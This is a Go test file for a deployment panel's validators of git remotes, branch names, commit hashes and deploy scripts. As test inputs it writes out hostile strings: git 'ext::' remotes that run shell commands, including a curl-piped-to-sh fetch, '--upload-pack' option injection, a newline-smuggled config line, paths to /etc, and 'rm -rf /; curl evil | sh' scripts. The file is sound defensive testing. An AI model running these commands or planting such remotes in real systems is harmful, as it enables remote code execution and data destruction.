package validate

import (
	"strings"
	"testing"
)

// The repository URL is the most dangerous string in Phase 27, and none of the
// danger is visible from looking at it: git's remote is not an address but a
// small language, and three of its dialects run programs.
func TestARemoteThatWouldRunAProgramIsRefused(t *testing.T) {
	for _, remote := range []string{
		// ext:: runs the command it names. This is remote code execution
		// spelled as a URL.
		"ext::sh -c whoami",
		"ext::curl https://example.com/x | sh",
		// A remote beginning with a hyphen is not a remote, it is an option —
		// and this one hands git a program to run as the pack process.
		"--upload-pack=/tmp/evil",
		"-u/tmp/evil",
		// file:// and bare paths read a repository on this host, including one
		// somebody uploaded through the file manager.
		"file:///etc",
		"/var/www/somewhere/.git",
		"../../../etc",
		// Transports the panel does not support, refused by not being on the
		// list rather than by being on a denylist.
		"git://github.com/owner/repo.git",
		"http://github.com/owner/repo.git",
		"rsync://host/repo",
		// Shapes that are almost right.
		"https://",
		"https:///owner/repo.git",
		"git@github.com",
		"git@github.com:/etc/passwd",
		"",
		"  ",
	} {
		if err := GitRemote(remote); err == nil {
			t.Errorf("GitRemote accepted %q", remote)
		}
	}
}

func TestTheTwoRemoteFormsAnybodyActuallyUsesAreAccepted(t *testing.T) {
	for _, remote := range []string{
		"https://github.com/owner/repo.git",
		"https://gitlab.example.com/group/subgroup/repo.git",
		"https://token@github.com/owner/repo.git",
		"git@github.com:owner/repo.git",
		"git@git.example.com:team/repo",
		"ssh://git@github.com/owner/repo.git",
		"ssh://git@git.example.com:2222/owner/repo.git",
	} {
		if err := GitRemote(remote); err != nil {
			t.Errorf("GitRemote refused %q: %v", remote, err)
		}
	}
}

func TestAControlCharacterInARemoteIsRefused(t *testing.T) {
	// A newline in a remote is how a second line reaches a configuration file
	// git writes it into.
	if err := GitRemote("https://github.com/owner/repo.git\nurl = ext::sh"); err == nil {
		t.Error("a remote containing a newline was accepted")
	}
}

func TestABranchNameGitWouldReadAsSomethingElseIsRefused(t *testing.T) {
	for _, branch := range []string{
		"",
		"-b",              // an option
		"--force",         // an option
		"main:refs/heads", // half a refspec
		"feature..main",   // a range
		"HEAD@{1}",        // a revision expression
		".hidden",
		"trailing.",
		"work.lock",
		"with space",
		"with\ttab",
		"star*",
		"tilde~1",
		"caret^",
		"back\\slash",
		"trailing/",
	} {
		if err := GitBranch(branch); err == nil {
			t.Errorf("GitBranch accepted %q", branch)
		}
	}
}

func TestOrdinaryBranchNamesAreAccepted(t *testing.T) {
	for _, branch := range []string{
		"main", "master", "develop",
		"feature/add-billing", "release/2.1", "hotfix_urgent", "v1.2.3",
	} {
		if err := GitBranch(branch); err != nil {
			t.Errorf("GitBranch refused %q: %v", branch, err)
		}
	}
}

func TestACommitMustBeHexadecimal(t *testing.T) {
	// git's revision syntax is a language: "HEAD@{1}", "main^", ":/fix" are all
	// valid revisions and none of them is what a caller naming a commit meant.
	for _, sha := range []string{
		"", "HEAD", "main^", ":/fix", "abc", "zzzzzzz",
		strings.Repeat("a", 41),
	} {
		if err := CommitSHA(sha); err == nil {
			t.Errorf("CommitSHA accepted %q", sha)
		}
	}
	for _, sha := range []string{
		"a1b2c3d",
		"5f2e8a19c4b7d0e3f6a2b9c8d1e4f7a0b3c6d9e2",
		"5F2E8A19C4B7D0E3",
	} {
		if err := CommitSHA(sha); err != nil {
			t.Errorf("CommitSHA refused %q: %v", sha, err)
		}
	}
}

func TestTheActionSetIsClosed(t *testing.T) {
	// Every template becomes an argv the Agent builds. A kind outside the set
	// is an error rather than a step that silently does nothing.
	if err := DeployAction("rm.everything"); err == nil {
		t.Error("an unknown action was accepted")
	}
	for _, action := range DeployActions {
		if err := DeployAction(action); err != nil {
			t.Errorf("DeployAction refused its own constant %q: %v", action, err)
		}
	}
}

func TestADeploymentScriptIsBoundedRatherThanParsed(t *testing.T) {
	// Deliberately no denylist. A denylist over a shell language is one
	// somebody gets around, and having it would suggest a safety that is not
	// there — what bounds this script is where it runs, not what it says.
	if err := DeployScript("rm -rf /; curl evil | sh"); err != nil {
		t.Errorf("a script was refused for its contents, which is a promise this cannot keep: %v", err)
	}
	// A NUL truncates the file at the C library, so the shell would run a
	// prefix of what was written — the one way this text could mean something
	// other than it says.
	if err := DeployScript("echo hello\x00rm -rf /"); err == nil {
		t.Error("a script containing a null byte was accepted")
	}
	if err := DeployScript(strings.Repeat("x", MaxDeployScript+1)); err == nil {
		t.Error("an oversized script was accepted")
	}
}

func TestADeploymentCannotRunForever(t *testing.T) {
	if err := ScriptTimeout(0); err == nil {
		t.Error("a deployment with no timeout was accepted")
	}
	if err := ScriptTimeout(MaxScriptTimeout + 1); err == nil {
		t.Error("a deployment that may run for over an hour was accepted")
	}
	if err := ScriptTimeout(600); err != nil {
		t.Errorf("ten minutes was refused: %v", err)
	}
}

func TestTheProviderSetIsClosed(t *testing.T) {
	if err := DeployProvider("bitbucket"); err == nil {
		t.Error("a provider the panel cannot verify a signature from was accepted")
	}
	for _, provider := range DeployProviders {
		if err := DeployProvider(provider); err != nil {
			t.Errorf("DeployProvider refused its own constant %q: %v", provider, err)
		}
	}
}
